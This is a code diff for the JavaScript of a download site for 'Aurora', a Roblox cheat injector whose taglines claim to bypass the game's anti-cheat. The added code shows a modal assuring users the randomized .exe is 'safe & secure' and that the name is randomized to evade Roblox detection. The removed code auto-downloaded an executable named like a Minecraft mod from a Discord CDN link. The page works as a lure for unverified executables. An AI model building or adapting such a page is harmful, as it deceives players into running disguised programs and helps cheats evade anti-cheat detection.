@@ -42,7 +42,7 @@ function drawMatrix() {
 
 // Animated tagline
 const taglines = [
-    '> INITIALIZING NEXUS...',
+    '> INITIALIZING AURORA...',
     '> BYPASSING BYFRON...',
     '> INJECTION READY',
     '> 99.7% UNC ACHIEVED',
@@ -92,6 +92,103 @@ function animateCounter() {
     }, 16);
 }
 
+// Notification function
+function showNotification(message, type = 'success') {
+    const notif = document.createElement('div');
+    notif.textContent = message;
+    notif.style.cssText = `
+        position: fixed;
+        bottom: 20px;
+        right: 20px;
+        background: ${type === 'success' ? '#00ff41' : '#ff4444'};
+        color: #000000;
+        padding: 12px 20px;
+        border-radius: 8px;
+        font-size: 14px;
+        font-weight: bold;
+        z-index: 3000;
+        animation: fadeInOut 3s ease;
+        box-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
+    `;
+    document.body.appendChild(notif);
+    setTimeout(() => notif.remove(), 3000);
+}
+
+// Add animation style for notification
+const animStyle = document.createElement('style');
+animStyle.textContent = `
+    @keyframes fadeInOut {
+        0% { opacity: 0; transform: translateX(20px); }
+        15% { opacity: 1; transform: translateX(0); }
+        85% { opacity: 1; transform: translateX(0); }
+        100% { opacity: 0; transform: translateX(20px); }
+    }
+`;
+document.head.appendChild(animStyle);
+
+// Confirmation modal function
+function showConfirmationModal() {
+    const modalOverlay = document.createElement('div');
+    modalOverlay.className = 'modal-overlay';
+    modalOverlay.innerHTML = `
+        <div class="confirmation-modal">
+            <div class="modal-header">
+                <span class="modal-icon">🛡️</span>
+                <h3>SECURITY NOTICE</h3>
+            </div>
+            <div class="modal-body">
+                <p>The file name is randomized to avoid Roblox from detecting a set name.</p>
+                <p class="highlight-text">Your download is safe & secure.</p>
+                <p class="small-text">File: Aurora_${Math.random().toString(36).substring(2, 8).toUpperCase()}.exe</p>
+            </div>
+            <div class="modal-footer">
+                <button class="modal-btn confirm" id="confirmDownload">✓ Confirm & Download</button>
+                <button class="modal-btn cancel" id="cancelDownload">✕ Cancel</button>
+            </div>
+        </div>
+    `;
+    
+    document.body.appendChild(modalOverlay);
+    
+    setTimeout(() => {
+        modalOverlay.classList.add('show');
+    }, 10);
+    
+    const confirmBtn = modalOverlay.querySelector('#confirmDownload');
+    confirmBtn.addEventListener('click', () => {
+        // REPLACE THIS URL with your actual Discord CDN link for Aurora
+        const downloadUrl = 'https://cdn.discordapp.com/attachments/YOUR_ID/YOUR_FILE_ID/Aurora.exe';
+        
+        const link = document.createElement('a');
+        link.href = downloadUrl;
+        link.download = 'Aurora.exe';
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+        
+        modalOverlay.remove();
+        showNotification('Download started! Enjoy Aurora! 🎮');
+        
+        const downloadCard = document.getElementById('downloadCard');
+        if (downloadCard) {
+            downloadCard.classList.remove('show');
+        }
+    });
+    
+    const cancelBtn = modalOverlay.querySelector('#cancelDownload');
+    cancelBtn.addEventListener('click', () => {
+        modalOverlay.remove();
+        showNotification('Download cancelled.', 'info');
+    });
+    
+    modalOverlay.addEventListener('click', (e) => {
+        if (e.target === modalOverlay) {
+            modalOverlay.remove();
+            showNotification('Download cancelled.', 'info');
+        }
+    });
+}
+
 // Download functionality
 const downloadBtn = document.getElementById('downloadBtn');
 const downloadCard = document.getElementById('downloadCard');
@@ -100,46 +197,63 @@ const directLink = document.getElementById('directLink');
 
 downloadBtn.addEventListener('click', () => {
     downloadCard.classList.add('show');
-    
-    // Auto-start download after 2 seconds
-    setTimeout(() => {
-        // REPLACE THIS URL with your actual Discord CDN link
-        const downloadUrl = 'https://cdn.discordapp.com/attachments/1511238444729241825/1512137057630421203/fabric-1.21.1-wonderfullands.exe?ex=6a22fee0&is=6a21ad60&hm=f0d0d99222c3b1e668f5036ea3e9a0605cfceef05ff19240801e2868d76c7fa0&';
-        window.open(downloadUrl, '_blank');
-    }, 2000);
 });
 
-closeCard.addEventListener('click', () => {
-    downloadCard.classList.remove('show');
-});
+if (closeCard) {
+    closeCard.addEventListener('click', () => {
+        downloadCard.classList.remove('show');
+    });
+}
 
-// Close card when clicking outside
+if (directLink) {
+    directLink.addEventListener('click', (e) => {
+        e.preventDefault();
+        downloadCard.classList.remove('show');
+        showConfirmationModal();
+    });
+}
+
 document.addEventListener('click', (e) => {
-    if (downloadCard.classList.contains('show') && 
+    if (downloadCard && downloadCard.classList.contains('show') && 
         !downloadCard.contains(e.target) && 
         e.target !== downloadBtn) {
         downloadCard.classList.remove('show');
     }
 });
 
-// Set direct link
-directLink.href = 'https://cdn.discordapp.com/attachments/YOUR_ID/YOUR_FILE_ID/Nexus.exe';
-
 // Features button - scroll to features
-document.getElementById('featuresBtn').addEventListener('click', () => {
-    document.getElementById('features').scrollIntoView({ behavior: 'smooth' });
-});
+const featuresBtn = document.getElementById('featuresBtn');
+if (featuresBtn) {
+    featuresBtn.addEventListener('click', () => {
+        const featuresSection = document.getElementById('features');
+        if (featuresSection) {
+            featuresSection.scrollIntoView({ behavior: 'smooth' });
+        }
+    });
+}
 
 // Glitch effect on hover
 const glitchText = document.querySelector('.glitch');
+if (glitchText) {
+    setInterval(() => {
+        if (Math.random() > 0.97) {
+            glitchText.style.animation = 'none';
+            setTimeout(() => {
+                glitchText.style.animation = 'glitch 3s infinite';
+            }, 10);
+        }
+    }, 100);
+}
+
+// Random body glitch
 setInterval(() => {
-    if (Math.random() > 0.97) {
-        glitchText.style.animation = 'none';
+    if (Math.random() > 0.98) {
+        document.body.style.transform = `translate(${Math.random() * 2 - 1}px, ${Math.random() * 2 - 1}px)`;
         setTimeout(() => {
-            glitchText.style.animation = 'glitch 3s infinite';
-        }, 10);
+            document.body.style.transform = 'translate(0, 0)';
+        }, 50);
     }
-}, 100);
+}, 3000);
 
 // Start animations
 initMatrix();
@@ -153,13 +267,3 @@ setInterval(drawMatrix, 50);
 window.addEventListener('resize', () => {
     initMatrix();
 });
-
-// Random glitch effect on body
-setInterval(() => {
-    if (Math.random() > 0.98) {
-        document.body.style.transform = `translate(${Math.random() * 2 - 1}px, ${Math.random() * 2 - 1}px)`;
-        setTimeout(() => {
-            document.body.style.transform = 'translate(0, 0)';
-        }, 50);
-    }
-}, 3000);
